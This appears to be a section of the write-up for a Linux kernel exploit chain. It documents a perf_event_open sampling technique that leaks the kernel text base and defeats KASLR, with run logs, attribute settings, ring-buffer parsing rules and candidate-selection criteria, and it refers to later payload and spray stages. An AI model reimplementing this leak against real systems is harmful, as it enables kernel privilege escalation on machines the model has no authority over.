# 02. perf KASLR sampling and address result

## Abstract

The first segment of the 3.1 path is `rc_perf_leak_text_base()`. It selects a live kernel text base from kernel IP samples in the perf ring buffer. This document records the visible sampling facts from the reference run and the selection rules present in source.

## Empirical sample

```text
[*] perf probe policy paranoid=-1
[*] perf probe open fd=3 errno=0 attr_size=136
[*] perf probe ring head=32752 tail=32752 records=2047 samples=2047 kernel=2047 lost=0 malformed=0
[*] perf probe sampled duration_ms=200 disable=0/0 min=ffffffe778d67770 max=ffffffe77ba02c5c
[*] perf probe candidate page=ffffffe779e00000 window=2044/2047 near=999 far=887 buckets=8
[+] perf probe text-base=ffffffe779e00000 min_kip=ffffffe778d67770 samples=2047
[+] slide-kaslr-perf-ok pid=23917 base=ffffffe779e00000 slide=0000002771e00000
[*] timing stage=kaslr pid=23917 elapsed_ms=202
```

## Method

The source uses `perf_event_open()` for a short sampling window:

| Field | Value |
| --- | --- |
| `type` | `PERF_TYPE_SOFTWARE` |
| `config` | `PERF_COUNT_SW_CPU_CLOCK` |
| `sample_period` | `1` |
| `sample_type` | `PERF_SAMPLE_IP` |
| `exclude_user` | `1` |
| `RC_PERF_PAGES` | `8` |
| default window | `PERF_PROBE_MSEC=200` |

Ring parsing rules:

| Rule | Purpose |
| --- | --- |
| read the 8-byte IP after `PERF_RECORD_SAMPLE` | collect candidate sample |
| `misc & 7 == 1` | count only kernel samples |
| `ip >= 0xffffffc008000000` | filter non-text candidates |
| `ip & 0xffffffffffe00000` | bucket by 2 MiB-aligned page |
| record `lost` and `malformed` | preserve sample-quality evidence |

## Candidate selection

The selector accepted `ffffffe779e00000` because:

| Condition | Observed value |
| --- | --- |
| ring quality | `2047/2047` kernel samples, `lost=0`, `malformed=0` |
| candidate-window coverage | `window=2044/2047` |
| neighboring bucket feature | `near=999`, `far=887` |
| bucket count | `buckets=8` |
| output base | `base=ffffffe779e00000` |
| output slide | `slide=0000002771e00000` |

This is a live-base conclusion for one boot. It is not a fixed address and it must not be reused as evidence for another boot.

## Address-use boundary

After `kaslr_done=1`, current source uses `text_addr()` to convert image-relative addresses in `target.h` into current-boot addresses. This only establishes that later calculations use the same accepted base. It does not by itself prove mm/slab placement, payload placement, spray hit, or route completion.

The bounded conclusion is: this run's perf samples support continuing the 3.1 path, and later logs in the same run should remain consistent with `base=ffffffe779e00000` and `slide=0000002771e00000`.
